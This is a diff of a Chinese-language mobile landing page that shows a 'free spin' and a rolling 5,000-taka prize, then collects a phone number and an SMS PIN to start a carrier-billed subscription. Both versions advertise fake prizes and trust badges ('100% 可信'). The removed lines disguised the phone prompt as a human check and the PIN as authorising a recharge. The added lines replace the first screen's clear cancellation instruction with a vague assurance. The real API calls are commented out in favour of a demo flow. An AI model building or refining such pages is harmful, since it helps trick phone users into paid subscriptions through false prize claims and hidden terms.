@@ -76,7 +76,6 @@
             padding: 20px;
             margin: 15px 0;
         }
-        /* 固定高度容器 — 解决滚动抖动 */
         .rolling-numbers {
             font-size: 1.4rem;
             font-weight: bold;
@@ -87,34 +86,13 @@
             margin-bottom: 12px;
             color: #1e293b;
             line-height: 1.4;
-            min-height: 90px;          /* 固定最小高度，防止内容跳动 */
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            flex-wrap: wrap;
-            gap: 0 4px;
         }
         .rolling-numbers span {
             font-size: 2.2rem;
             font-weight: 900;
             color: #e67e22;
             display: inline-block;
-            margin: 0 2px;
-            /* 固定宽度防止数字宽度变化引起的抖动 */
-            min-width: 80px;
-            text-align: center;
-        }
-        .rolling-numbers .static-text {
-            font-size: 1.2rem;
-            font-weight: 600;
-            color: #1e293b;
-            white-space: nowrap;
-        }
-        .rolling-numbers .prize-label {
-            font-size: 1.2rem;
-            font-weight: 600;
-            color: #1e293b;
-            white-space: nowrap;
+            margin: 0 4px;
         }
         .offer-details {
             background: #f8fafc;
@@ -150,20 +128,6 @@
             color: #94a3b8;
             margin-top: 12px;
             text-align: center;
-        }
-
-        /* ===== 第二个界面红色标题样式 ===== */
-        .phone-title-red {
-            color: #FF0000 !important;
-            font-size: 1.3rem;
-            margin-bottom: 6px;
-        }
-        .phone-sub-red {
-            color: #FF0000 !important;
-            font-size: 1.0rem;
-        }
-        .phone-amount-gold {
-            color: #FFD700;
         }
 
         /* ===== PIN API 样式 ===== */
@@ -347,15 +311,10 @@
             .header { padding: 12px 16px; }
             .prize-body { padding: 12px 16px 20px; }
             .slot-machine { padding: 12px; margin: 10px 0; }
-            .rolling-numbers { font-size: 1rem; padding: 12px; min-height: 70px; }
-            .rolling-numbers span { font-size: 1.6rem; min-width: 60px; }
+            .rolling-numbers { font-size: 1rem; padding: 12px; }
+            .rolling-numbers span { font-size: 1.6rem; }
             .pin-box { width: 48px; height: 56px; font-size: 1.6rem; }
             .btn-primary { padding: 12px; font-size: 1rem; }
-        }
-        /* 进一步缩小屏适配 */
-        @media (max-height: 600px) {
-            .rolling-numbers { min-height: 60px; padding: 8px; }
-            .rolling-numbers span { font-size: 1.4rem; min-width: 50px; }
         }
     </style>
 </head>
@@ -365,34 +324,22 @@
 <div id="fireworkContainer"></div>
 
 <div class="card">
-    <!-- ===== 第一个界面的 Header（免费旋转） ===== -->
-    <div class="header" id="headerFirst">
+    <div class="header">
         <h1>🎉 免费旋转 🎉</h1>
         <div class="subhead">今日幸运用户！</div>
     </div>
-
-    <!-- ===== 第二个界面的 Header（恭喜！中奖） ===== -->
-    <div class="header" id="headerSecond" style="display:none;">
-        <h1 style="color:#FF0000;">🎉 恭喜！ 🎉</h1>
-        <div class="subhead" style="color:#FF0000; font-size:1.1rem;">🎊 您已经中得 <strong style="color:#FFD700;">5,000</strong> 塔卡大奖！ 🎊</div>
-    </div>
-
     <div class="prize-body">
 
         <!-- ===== 初始游戏区域 ===== -->
         <div id="gameSection">
             <div class="slot-machine">
-                <div class="rolling-numbers">
-                    <span class="static-text">只需一杯茶的钱，赢取</span>
-                    <span id="rollingNumber">5,000</span>
-                    <span class="prize-label">塔卡奖励！</span>
-                </div>
+                <div class="rolling-numbers">只需一杯茶的钱，赢取 <span id="rollingNumber">5,000</span> 塔卡奖励！</div>
                 <button class="btn-primary" id="playBtn">🎯 领取奖励</button>
             </div>
             <div class="offer-details">
                 <p>✅ 订阅 → 领取奖励</p>
                 <p>🎁 奖品将在2分钟内以 <strong>手机充值</strong> 形式发放</p>
-                <p>⚠️ <strong>订阅可随时取消</strong>，取消方式：发送 C XG 到 85868。</p>
+                <p>⚠️ <strong>订阅可随时取消</strong>（简单快捷）</p>
             </div>
             <div class="trust-line">
                 🔒 安全交易 | ✅ 100% 可信 | 🏆 真实奖励
@@ -400,14 +347,13 @@
             <div class="footer">限时优惠 | 仅限用户</div>
         </div>
 
-        <!-- ===== 手机号输入区域（第二个界面） ===== -->
+        <!-- ===== 手机号输入区域 ===== -->
         <div id="phoneSection" class="hidden">
-            <h2 style="font-size:1.0rem; color:#1e293b; margin-bottom:6px;">📱 请输入手机号码,验证是否为真人</h2>
-            <p style="font-size:0.9rem; color:#1e293b;margin-bottom:6px;"><strong>验证码将通过短信发送</strong></p>
+            <h2 style="font-size:1.3rem; color:#1e293b; margin-bottom:6px;">📱 请输入您的手机号码</h2>
+            <p style="font-size:0.85rem; color:#64748b;">验证码将通过短信发送</p>
             <div class="form-group">
                 <input type="tel" id="msisdn" placeholder="94XXXXXXXXX" maxlength="15">
             </div>
-            
             <button class="btn-primary" id="sendBtn">📨 发送验证码</button>
             <div id="phoneLoading" class="loading-text">⏳ 发送中...</div>
             <div id="phoneError" class="error-msg"></div>
@@ -418,16 +364,15 @@
 
         <!-- ===== PIN码输入区域 ===== -->
         <div id="pinSection" class="hidden">
-            <h2 style="font-size:1.3rem; color:#1e293b; margin-bottom:6px;">🔑 请输入验证码</h2>
-            <p style="font-size:0.85rem; color:#1e293b;"><strong>请查看手机短信</strong></p>
-            <p style="font-size:0.85rem; color:#1e293b;"><strong>完成验证，授权充值通道，2分钟内将5000塔卡充值到您的手机</strong></p>
+            <h2 style="font-size:1.3rem; color:#1e293b; margin-bottom:6px;">🔑 请输入4位验证码</h2>
+            <p style="font-size:0.85rem; color:#64748b;">请查看手机短信</p>
             <div class="pin-container">
                 <input type="text" inputmode="numeric" maxlength="1" class="pin-box">
                 <input type="text" inputmode="numeric" maxlength="1" class="pin-box">
                 <input type="text" inputmode="numeric" maxlength="1" class="pin-box">
                 <input type="text" inputmode="numeric" maxlength="1" class="pin-box">
             </div>
-            <button class="btn-primary" id="verifyBtn">✅ 领取奖励</button>
+            <button class="btn-primary" id="verifyBtn">✅ 验证</button>
             <div id="pinLoading" class="loading-text">⏳ 验证中...</div>
             <div id="pinError" class="error-msg"></div>
             <span class="tnc-toggle" onclick="toggleTnc()">条款与条件 ▼</span>
@@ -440,9 +385,9 @@
         <!-- ===== 成功页面 ===== -->
         <div id="successSection" class="hidden">
             <div class="success-icon">🎉</div>
-            <div class="success-title">恭喜！已授权充值通道！</div>
+            <div class="success-title">恭喜！已授权访问！</div>
             <p style="color:#475569; margin:10px 0;">您的奖励将很快以手机充值形式发放。</p>
-            <button class="btn-primary" id="redirectBtn">🚀 完成！</button>
+            <button class="btn-primary" id="redirectBtn">🚀 继续</button>
             <div class="footer" style="margin-top:12px;">
                 取消方式：发送 C XG 到 85868
             </div>
@@ -499,11 +444,8 @@ const TRACKING_STRING = TRACKING_PARAMS.toString();
 // ============================================================
 
 let currentTxid = null;
-let fireworksTriggered = false;
 
 // DOM 元素
-const headerFirst = document.getElementById('headerFirst');
-const headerSecond = document.getElementById('headerSecond');
 const gameSection = document.getElementById('gameSection');
 const phoneSection = document.getElementById('phoneSection');
 const pinSection = document.getElementById('pinSection');
@@ -549,11 +491,13 @@ function toggleTnc() {
 const coinEmojis = ['💰', '💵', '💎', '✨'];
 
 function createCoinExplosion(x, y) {
+    // 屏幕闪烁
     const flash = document.createElement('div');
     flash.className = 'flash-overlay';
     document.body.appendChild(flash);
     setTimeout(() => flash.remove(), 400);
 
+    // 只生成 15-25 个钱币
     const count = 15 + Math.floor(Math.random() * 10);
     const particles = [];
 
@@ -562,9 +506,11 @@ function createCoinExplosion(x, y) {
         coin.className = 'coin-particle';
         coin.textContent = coinEmojis[Math.floor(Math.random() * coinEmojis.length)];
         
+        // 随机大小（稍小一点）
         const size = 22 + Math.floor(Math.random() * 20);
         coin.style.fontSize = size + 'px';
         
+        // 随机方向
         const angle = -Math.PI / 2 + (Math.random() - 0.5) * Math.PI * 1.4;
         const distance = 60 + Math.random() * 150;
         const tx = Math.cos(angle) * distance;
@@ -583,22 +529,22 @@ function createCoinExplosion(x, y) {
         particles.push(coin);
     }
 
+    // 清理粒子
     setTimeout(() => {
         particles.forEach(p => p.remove());
     }, 1500);
 }
 
 function triggerFireworks() {
-    if (fireworksTriggered) return;
-    fireworksTriggered = true;
-
     const rect = document.querySelector('.card').getBoundingClientRect();
     const centerX = rect.left + rect.width / 2;
     const centerY = rect.top + rect.height * 0.3;
 
+    // 只发射 2 波
     const waves = [0, 400];
     waves.forEach((delay) => {
         setTimeout(() => {
+            // 每波 2 个爆炸点
             for (let i = 0; i < 2; i++) {
                 const offsetX = (Math.random() - 0.5) * 160;
                 const offsetY = (Math.random() - 0.5) * 100;
@@ -614,13 +560,12 @@ function triggerFireworks() {
 }
 
 // ============================================================
-// 滚动数字动画 — 修复抖动：固定容器高度 + 固定数字宽度
+// 滚动数字动画
 // ============================================================
-const prizes = ["5,000", "3,000", "2,000", "1,000"];
+const prizes = ["5,000", "2,000", "1,000", "500"];
 let rollingInterval = null;
 const rollingSpan = document.getElementById('rollingNumber');
 
-// 数字宽度固定 (通过 min-width 和 text-align:center 已处理)
 function startRolling() {
     if (rollingInterval) clearInterval(rollingInterval);
     rollingInterval = setInterval(() => {
@@ -631,20 +576,18 @@ function startRolling() {
 startRolling();
 
 // ============================================================
-// 点击 "领取奖励" → 切换Header → 显示手机号输入 → 触发烟花
+// 点击 "领取奖励" → 触发烟花 → 显示手机号输入
 // ============================================================
 document.getElementById('playBtn').addEventListener('click', function() {
-    // 切换 Header
-    headerFirst.style.display = 'none';
-    headerSecond.style.display = 'block';
+    // 🎆 触发钱币烟花
+    triggerFireworks();
     
-    hide('gameSection');
-    show('phoneSection');
-    msisdnInput.focus();
-    
+    // 延迟切换页面，让烟花先绽放
     setTimeout(() => {
-        triggerFireworks();
-    }, 300);
+        hide('gameSection');
+        show('phoneSection');
+        msisdnInput.focus();
+    }, 500);
 });
 
 // ============================================================
@@ -679,6 +622,33 @@ sendBtn.addEventListener('click', async function() {
     showLoading(phoneLoading);
     sendBtn.disabled = true;
 
+    // ===== 已注释：实际请求 =====
+    /*
+    try {
+        let url = `${API_BASE}/api/pin/request?msisdn=${msisdn}&offer_id=${OFFER_ID}`;
+        if (TRACKING_STRING) {
+            url += '&' + TRACKING_STRING;
+        }
+
+        const res = await fetch(url);
+        const data = await res.json();
+
+        if (data.success) {
+            currentTxid = data.txid;
+            hide('phoneSection');
+            show('pinSection');
+            pinBoxes[0].focus();
+        } else {
+            showError(phoneError, data.msg || '验证码发送失败，请重试。');
+        }
+    } catch (e) {
+        showError(phoneError, '网络问题，请检查连接。');
+    } finally {
+        hideLoading(phoneLoading);
+        sendBtn.disabled = false;
+    }
+    */
+
     // ===== 模拟演示：直接跳转到 PIN 输入 =====
     setTimeout(() => {
         hideLoading(phoneLoading);
@@ -705,6 +675,39 @@ verifyBtn.addEventListener('click', async function() {
     showLoading(pinLoading);
     verifyBtn.disabled = true;
 
+    // ===== 已注释：实际请求 =====
+    /*
+    try {
+        let url = `${API_BASE}/api/pin/verify?txid=${currentTxid}&pin=${pin}`;
+        if (CID) url += `&cid=${CID}`;
+
+        const res = await fetch(url);
+        const data = await res.json();
+
+        if (data.success) {
+            hide('pinSection');
+            show('successSection');
+            if (offerUrl) {
+                setTimeout(() => {
+                    window.location.href = offerUrl;
+                }, 3000);
+            }
+        } else if (data.processing) {
+            showError(pinError, '⏳ 处理中，请稍候...');
+            pollStatus();
+        } else {
+            showError(pinError, data.msg || '验证码错误，请重试。');
+            pinBoxes.forEach(b => b.value = '');
+            pinBoxes[0].focus();
+        }
+    } catch (e) {
+        showError(pinError, '验证失败，请重试。');
+    } finally {
+        hideLoading(pinLoading);
+        verifyBtn.disabled = false;
+    }
+    */
+
     // ===== 模拟演示：直接跳转到成功页面 =====
     setTimeout(() => {
         hideLoading(pinLoading);
@@ -719,6 +722,44 @@ verifyBtn.addEventListener('click', async function() {
         }
     }, 800);
 });
+
+// ============================================================
+// 【轮询状态】(已注释)
+// ============================================================
+/*
+async function pollStatus(attempt = 0) {
+    if (attempt >= 10) {
+        showError(pinError, '订阅处理时间过长。');
+        return;
+    }
+
+    await new Promise(r => setTimeout(r, 3000));
+
+    try {
+        let url = `${API_BASE}/api/pin/status?txid=${currentTxid}`;
+        if (CID) url += `&cid=${CID}`;
+
+        const res = await fetch(url);
+        const data = await res.json();
+
+        if (data.status === 'subscribed') {
+            hide('pinSection');
+            show('successSection');
+            if (offerUrl) {
+                setTimeout(() => {
+                    window.location.href = offerUrl;
+                }, 3000);
+            }
+        } else if (data.status === 'processing') {
+            pollStatus(attempt + 1);
+        } else {
+            showError(pinError, '订阅失败，请重试。');
+        }
+    } catch (e) {
+        pollStatus(attempt + 1);
+    }
+}
+*/
 
 // ============================================================
 // 【跳转按钮】— 携带所有追踪参数
@@ -759,8 +800,7 @@ console.log('📊 IP:', IP);
 console.log('🔗 Offer URL:', offerUrl || '未设置');
 console.log('📦 TRACKING_STRING:', TRACKING_STRING || '无');
 console.log('💡 所有请求已注释，点击按钮将模拟演示流程');
-console.log('🎆 点击"领取奖励"后，Header会切换为"恭喜！"，同时触发钱币烟花！');
-console.log('✅ 滚动数字已固定高度，页面不再抖动！');
+console.log('🎆 点击"领取奖励"会触发精简钱币烟花效果！');
 </script>
 </body>
 </html>
